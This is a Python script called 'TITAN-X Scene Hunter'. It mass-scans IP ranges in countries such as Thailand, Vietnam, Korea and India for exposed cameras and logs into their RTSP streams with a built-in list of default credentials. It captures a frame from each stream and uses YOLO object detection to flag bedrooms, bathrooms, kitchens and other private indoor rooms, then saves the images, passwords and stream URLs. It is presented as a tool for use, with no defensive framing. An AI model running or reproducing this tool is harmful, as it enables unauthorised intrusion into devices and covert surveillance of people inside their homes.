#!/usr/bin/env python3
"""
TITAN-X Scene Hunter — Multi-country camera discovery with YOLO scene classification.
Targets daytime regions for indoor scene detection (dining room, kitchen, bedroom, etc.)
Combines: masscan → RTSP probe → YOLO classify → filter by scene type.
"""
import subprocess, os, json, sys, time, signal, ipaddress, random
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# === CONFIG ===
CREDS = [
    ('admin', '12345'), ('admin', ''), ('admin', 'admin'), ('admin', '1234'),
    ('admin', '123456'), ('admin', '1111'), ('admin', '888888'), ('admin', 'password'),
    ('root', ''), ('root', 'pass'), ('root', '1234'), ('root', '12345'),
    ('666666', '666666'), ('888888', '888888'), ('ubnt', 'ubnt'),
    ('admin', '54321'), ('admin', '111111'), ('admin', 'HikHik'), ('admin', 'hikvision'),
]

RTSP_PATHS = [
    '/Streaming/Channels/101',
    '/Streaming/Channels/1',
    '/h264/ch1/main/av_stream',
    '/cam/realmonitor?channel=1&subtype=0',
    '/live/ch00_0',
    '/stream1',
    '/11',
    '/onvif1',
]

# Scene classification mapping: COCO class -> scene type
SCENE_MAP = {
    # Kitchen / Dining
    'refrigerator': 'kitchen', 'oven': 'kitchen', 'microwave': 'kitchen',
    'sink': 'kitchen', 'toaster': 'kitchen',
    'dining table': 'dining_room', 'bowl': 'dining_room', 'cup': 'dining_room',
    'wine glass': 'dining_room', 'fork': 'dining_room', 'knife': 'dining_room',
    'spoon': 'dining_room', 'bottle': 'dining_room',
    # Living Room
    'sofa': 'living_room', 'couch': 'living_room', 'tv': 'living_room',
    'remote': 'living_room', 'vase': 'living_room',
    # Bedroom
    'bed': 'bedroom',
    # Office
    'laptop': 'office', 'keyboard': 'office', 'mouse': 'office',
    'book': 'office', 'clock': 'office',
    # Outside
    'car': 'outside', 'truck': 'outside', 'bus': 'outside', 'bicycle': 'outside',
    'motorcycle': 'outside', 'traffic light': 'outside', 'stop sign': 'outside',
    'fire hydrant': 'outside', 'parking meter': 'outside', 'bench': 'outside',
    'dog': 'outside', 'cat': 'indoor', 'bird': 'outside',
    'potted plant': 'indoor',
    # People (context-dependent)
    'person': None, 'chair': 'indoor', 'handbag': 'indoor', 'backpack': None,
    'umbrella': 'outside', 'tie': 'office', 'suitcase': 'indoor',
    'sports ball': 'outside', 'skateboard': 'outside', 'surfboard': 'outside',
    'tennis racket': 'outside', 'kite': 'outside', 'baseball bat': 'outside',
    'frisbee': 'outside', 'skis': 'outside', 'snowboard': 'outside',
    'teddy bear': 'bedroom', 'hair drier': 'bedroom', 'toothbrush': 'bathroom',
    'toilet': 'bathroom', 'scissors': 'office', 'cell phone': None,
}

# Country CIDR sample ranges known for exposed cameras
# Targeting daytime regions (Asia-Pacific, Middle East, South Asia — it's morning/noon there)
COUNTRY_RANGES = {
    'TH': [  # Thailand — lots of exposed Hikvision
        '171.96.0.0/14', '49.228.0.0/14', '184.22.0.0/16', '1.46.0.0/15',
        '110.164.0.0/14', '118.172.0.0/14', '223.206.0.0/15',
    ],
    'VN': [  # Vietnam — dense camera exposure
        '14.160.0.0/12', '113.160.0.0/12', '42.112.0.0/13', '27.64.0.0/13',
        '115.72.0.0/13', '123.16.0.0/13',
    ],
    'ID': [  # Indonesia
        '36.64.0.0/12', '114.120.0.0/13', '180.240.0.0/13', '103.3.0.0/16',
        '182.0.0.0/12',
    ],
    'IN': [  # India — massive camera count
        '49.32.0.0/13', '103.0.0.0/12', '117.192.0.0/12', '122.160.0.0/13',
        '59.88.0.0/13', '106.192.0.0/12',
    ],
    'MX': [  # Mexico — daytime soon
        '187.128.0.0/11', '189.128.0.0/11', '201.128.0.0/13',
    ],
    'BR': [  # Brazil — late night but dense
        '177.0.0.0/10', '179.0.0.0/10', '186.192.0.0/11', '200.128.0.0/11',
    ],
    'KR': [  # South Korea — daytime, many cameras
        '211.104.0.0/13', '121.128.0.0/11', '175.192.0.0/12', '220.64.0.0/11',
    ],
    'TR': [  # Turkey — morning
        '78.160.0.0/12', '88.224.0.0/12', '176.224.0.0/12', '95.0.0.0/13',
    ],
    'IR': [  # Iran — morning
        '2.144.0.0/12', '5.52.0.0/14', '37.98.0.0/15', '46.100.0.0/15',
    ],
    'PH': [  # Philippines — daytime
        '49.144.0.0/13', '112.198.0.0/15', '120.28.0.0/14',
    ],
}

os.makedirs('frames', exist_ok=True)
os.makedirs('scenes', exist_ok=True)

# ---- PHASE 1: Masscan on selected country ranges ----

def masscan_country(country, ranges, rate=80000, ports='554,8000,80'):
    """Run masscan on country CIDR ranges, return list of IPs with port 554 or 8000"""
    cidr_file = f'/tmp/cidr_{country}.txt'
    result_file = f'/tmp/masscan_{country}.txt'

    with open(cidr_file, 'w') as f:
        f.write('\n'.join(ranges))

    cmd = [
        'masscan', '-iL', cidr_file, '-p', ports,
        '--rate', str(rate), '--open-only', '-oG', result_file,
        '--exclude', '255.255.255.255'
    ]
    print(f'  [{country}] masscan {len(ranges)} ranges at {rate} pps on ports {ports}...')
    try:
        subprocess.run(cmd, capture_output=True, timeout=300, text=True)
    except subprocess.TimeoutExpired:
        print(f'  [{country}] masscan timed out (5 min cap)')

    # Parse results
    ips_by_port = {}
    if os.path.exists(result_file):
        with open(result_file) as f:
            for line in f:
                if line.startswith('#') or not line.strip():
                    continue
                parts = line.split()
                for i, p in enumerate(parts):
                    if p == 'Host:' and i + 1 < len(parts):
                        ip = parts[i + 1]
                    if 'Ports:' in p and i + 1 < len(parts):
                        port_str = parts[i + 1]
                        port_num = port_str.split('/')[0]
                        if ip:
                            ips_by_port.setdefault(ip, set()).add(port_num)

    # Prioritize IPs with RTSP port (554) or Hikvision (8000)
    rtsp_ips = [ip for ip, ports in ips_by_port.items() if '554' in ports]
    hik_ips = [ip for ip, ports in ips_by_port.items() if '8000' in ports]
    dual = [ip for ip, ports in ips_by_port.items() if '554' in ports and '8000' in ports]

    print(f'  [{country}] Found: {len(ips_by_port)} hosts | {len(rtsp_ips)} RTSP | {len(hik_ips)} Hik | {len(dual)} dual')
    # Return dual-port first, then RTSP-only, then Hik-only
    priority = list(set(dual))
    priority += [ip for ip in rtsp_ips if ip not in priority]
    priority += [ip for ip in hik_ips if ip not in priority]
    return priority


# ---- PHASE 2: RTSP Probe ----

def probe_rtsp(ip):
    """Try RTSP with common creds — fastest path to stream"""
    for user, passwd in CREDS:
        for rpath in RTSP_PATHS:
            auth = f'{user}:{passwd}@' if passwd else f'{user}:@'
            rtsp_url = f'rtsp://{auth}{ip}:554{rpath}'
            frame = f'frames/frame_{ip.replace(".", "_")}.jpg'
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=7, text=True
                )
                if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 1000:
                    sz = os.path.getsize(frame)
                    return {
                        'ip': ip, 'user': user, 'password': passwd,
                        'rtsp_url': rtsp_url, 'rtsp_path': rpath,
                        'frame_file': frame, 'frame_size': sz,
                    }
            except subprocess.TimeoutExpired:
                pass
            except Exception:
                pass
            if os.path.exists(frame) and os.path.getsize(frame) <= 1000:
                try: os.remove(frame)
                except: pass
    return None


# ---- PHASE 3: YOLO Scene Classification ----

def init_yolo():
    """Load YOLO model"""
    try:
        from ultralytics import YOLO
        model_path = 'yolo11n.pt'
        if not os.path.exists(model_path):
            model_path = 'yolov8n.pt'
        if not os.path.exists(model_path):
            print('[!] No YOLO model found — downloading yolov8n.pt')
            model_path = 'yolov8n.pt'
        model = YOLO(model_path)
        print(f'[+] YOLO loaded: {model_path}')
        return model
    except Exception as e:
        print(f'[!] YOLO init failed: {e}')
        return None


def classify_frame(model, frame_path):
    """Classify a frame and return scene info"""
    if not model or not os.path.exists(frame_path):
        return None

    try:
        results = model(frame_path, conf=0.20, verbose=False)
        detections = []
        scene_votes = {}

        for r in results:
            for box in r.boxes:
                cls_name = r.names[int(box.cls)]
                conf = float(box.conf)
                detections.append({'object': cls_name, 'confidence': round(conf, 3)})
                scene = SCENE_MAP.get(cls_name)
                if scene:
                    scene_votes[scene] = scene_votes.get(scene, 0) + conf

        if not scene_votes:
            return {'scene': 'unclassified', 'confidence': 0, 'objects': detections, 'votes': {}}

        best_scene = max(scene_votes, key=scene_votes.get)
        best_conf = scene_votes[best_scene]
        return {
            'scene': best_scene,
            'confidence': round(best_conf, 3),
            'objects': detections,
            'votes': {k: round(v, 3) for k, v in scene_votes.items()},
        }
    except Exception as e:
        return None


# ---- MAIN PIPELINE ----

def save_scene_frame(result, classification, country):
    """Copy interesting frames to scenes/ folder with descriptive name"""
    import shutil
    scene = classification.get('scene', 'unknown')
    ip = result['ip'].replace('.', '_')
    dst = f'scenes/{country}_{scene}_{ip}.jpg'
    if os.path.exists(result['frame_file']):
        shutil.copy2(result['frame_file'], dst)
    return dst


def run_pipeline(countries, max_per_country=150, rate=80000, workers=40, target_scenes=None):
    """Full pipeline: masscan → RTSP probe → YOLO classify"""
    if target_scenes is None:
        target_scenes = ['dining_room', 'kitchen', 'living_room', 'bedroom', 'office', 'bathroom', 'indoor']

    print(f'\n{"="*80}')
    print(f'TITAN-X SCENE HUNTER v1.0')
    print(f'Target scenes: {", ".join(target_scenes)}')
    print(f'Countries: {", ".join(countries)}')
    print(f'Max targets per country: {max_per_country} | Masscan rate: {rate} | Workers: {workers}')
    print(f'Started: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    print(f'{"="*80}\n')

    # Load YOLO
    yolo_model = init_yolo()
    if not yolo_model:
        print('[FATAL] Cannot load YOLO model, aborting.')
        return

    all_results = []
    all_scenes = []

    for country in countries:
        ranges = COUNTRY_RANGES.get(country)
        if not ranges:
            print(f'[!] No CIDR ranges for {country}, skipping')
            continue

        print(f'\n{"="*60}')
        print(f'[PHASE 1] MASSCAN — {country} ({len(ranges)} ranges)')
        print(f'{"="*60}')

        targets = masscan_country(country, ranges, rate=rate)
        if not targets:
            print(f'  [{country}] No targets found, next country')
            continue

        # Limit targets
        targets = targets[:max_per_country]
        print(f'\n[PHASE 2] RTSP PROBE — {country} | {len(targets)} targets | {workers} workers')

        streams_found = []
        done = 0
        t0 = time.time()

        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(probe_rtsp, ip): ip for ip in targets}
            for fut in as_completed(futures):
                done += 1
                ip = futures[fut]
                try:
                    r = fut.result()
                    if r:
                        streams_found.append(r)
                        print(f'  [{done}/{len(targets)}] STREAM: {ip} | {r["user"]}:{r["password"]} | {r["rtsp_path"]} | {r["frame_size"]:,}B')
                        sys.stdout.flush()
                except Exception:
                    pass
                if done % 25 == 0:
                    elapsed = time.time() - t0
                    print(f'  [{done}/{len(targets)}] {elapsed:.0f}s | {len(streams_found)} streams')
                    sys.stdout.flush()

        elapsed = time.time() - t0
        print(f'  [{country}] RTSP done: {len(streams_found)} streams in {elapsed:.0f}s')

        if not streams_found:
            continue

        # PHASE 3: YOLO Classification
        print(f'\n[PHASE 3] YOLO CLASSIFICATION — {country} | {len(streams_found)} frames')
        for stream in streams_found:
            classification = classify_frame(yolo_model, stream['frame_file'])
            stream['country'] = country
            stream['timestamp'] = datetime.now().isoformat()

            if classification:
                stream['scene'] = classification
                scene_type = classification['scene']
                objs = [d['object'] for d in classification.get('objects', [])]
                print(f'  {stream["ip"]:>15} | {scene_type:>15} ({classification["confidence"]:.2f}) | objects: {objs}')

                if scene_type in target_scenes or scene_type == 'unclassified':
                    scene_file = save_scene_frame(stream, classification, country)
                    stream['scene_file'] = scene_file

                    if scene_type in target_scenes:
                        all_scenes.append(stream)
                        print(f'    *** TARGET SCENE MATCH: {scene_type.upper()} ***')
            else:
                stream['scene'] = {'scene': 'unclassified', 'confidence': 0, 'objects': [], 'votes': {}}
                print(f'  {stream["ip"]:>15} | {"unclassified":>15} (night/blank)')

            all_results.append(stream)

    # Final Summary
    print(f'\n{"="*80}')
    print(f'SCENE HUNTER COMPLETE | {datetime.now().strftime("%H:%M:%S")}')
    print(f'{"="*80}')
    print(f'Total streams found: {len(all_results)}')
    print(f'Target scene matches: {len(all_scenes)}')

    # Scene breakdown
    scene_counts = {}
    for r in all_results:
        s = r.get('scene', {}).get('scene', 'unclassified')
        scene_counts[s] = scene_counts.get(s, 0) + 1
    print(f'\nScene Breakdown:')
    for scene, count in sorted(scene_counts.items(), key=lambda x: -x[1]):
        marker = ' *** TARGET' if scene in target_scenes else ''
        print(f'  {scene:>20}: {count}{marker}')

    if all_scenes:
        print(f'\n=== TARGET SCENE MATCHES ===')
        for s in all_scenes:
            sc = s.get('scene', {})
            print(f'  {s["country"]} | {s["ip"]:>15} | {sc.get("scene","?"):>15} ({sc.get("confidence",0):.2f}) | RTSP: {s["rtsp_url"]}')
            if sc.get('objects'):
                objs = [f'{d["object"]}({d["confidence"]:.0%})' for d in sc['objects']]
                print(f'    Objects: {", ".join(objs)}')

    # Save results
    out_file = f'scene_hunter_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    with open(out_file, 'w') as f:
        json.dump({
            'timestamp': datetime.now().isoformat(),
            'countries': countries,
            'target_scenes': target_scenes,
            'total_streams': len(all_results),
            'scene_matches': len(all_scenes),
            'scene_breakdown': scene_counts,
            'all_streams': all_results,
            'target_matches': all_scenes,
        }, f, indent=2, default=str)
    print(f'\nResults saved: {out_file}')

    # Also save just the scene matches for quick reference
    if all_scenes:
        match_file = f'scene_matches_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(match_file, 'w') as f:
            json.dump(all_scenes, f, indent=2, default=str)
        print(f'Scene matches saved: {match_file}')

    return all_results, all_scenes


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='TITAN-X Scene Hunter — find cameras by scene type')
    parser.add_argument('-c', '--countries', nargs='+', default=['TH', 'VN', 'KR'],
                        help='Country codes (default: TH VN KR — Asia daytime)')
    parser.add_argument('-m', '--max-targets', type=int, default=150,
                        help='Max targets per country (default: 150)')
    parser.add_argument('-r', '--rate', type=int, default=80000,
                        help='Masscan rate (default: 80000)')
    parser.add_argument('-w', '--workers', type=int, default=40,
                        help='RTSP probe thread count (default: 40)')
    parser.add_argument('-s', '--scenes', nargs='+',
                        default=['dining_room', 'kitchen', 'living_room', 'bedroom', 'office', 'bathroom', 'indoor'],
                        help='Target scene types to match')
    parser.add_argument('--all-scenes', action='store_true',
                        help='Report all scene types (not just targets)')

    args = parser.parse_args()

    if args.all_scenes:
        args.scenes = list(set(SCENE_MAP.values()) - {None})

    run_pipeline(
        countries=args.countries,
        max_per_country=args.max_targets,
        rate=args.rate,
        workers=args.workers,
        target_scenes=args.scenes,
    )
